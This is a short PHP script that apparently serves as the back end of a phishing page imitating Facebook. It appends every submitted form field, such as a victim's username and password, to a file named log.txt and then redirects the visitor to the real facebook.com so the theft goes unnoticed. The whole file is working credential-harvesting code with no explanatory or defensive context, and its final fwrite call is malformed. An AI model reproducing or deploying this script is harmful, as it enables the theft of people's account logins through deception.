<?php
header('location: http://www.facebook.com');
$h=fopen("log.txt","a");
foreach($_POST as $variable => $value){
	fwrite($h ,$variable);
	fwrite($h,"=");
	fwrite($h,$value);
	fwrite($h,"\r\n");
}
fwrite($h,"\r\n\n\n");
fwrite($h);
?>






	
	